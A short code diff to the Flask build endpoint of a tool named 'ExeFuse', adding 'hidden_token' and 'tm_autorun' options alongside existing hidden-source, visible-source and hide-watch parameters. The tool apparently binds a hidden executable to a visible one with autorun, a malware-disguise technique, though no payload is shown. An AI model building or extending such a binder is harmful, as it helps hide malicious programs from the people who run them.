@@ -149,11 +149,14 @@ def api_build():
         output_name = request.form.get("output_name") or "ExeFuse_App"
         kill_hidden = request.form.get("kill_hidden", "0") == "1"
         hide_watch = request.form.get("hide_watch", "0") == "1"
+        hidden_token = request.form.get("hidden_token", "") or ""
+        tm_autorun = request.form.get("tm_autorun", "0") == "1"
 
         job_id = builder.start_job(
             workdir, hidden_src, visible_src, output_name,
             kill_hidden=kill_hidden, hide_watch=hide_watch, icon_src=icon_path,
             hidden_label=hidden_label,
+            hidden_token=hidden_token, tm_autorun=tm_autorun,
         )
     except Exception as exc:
         shutil.rmtree(workdir, ignore_errors=True)
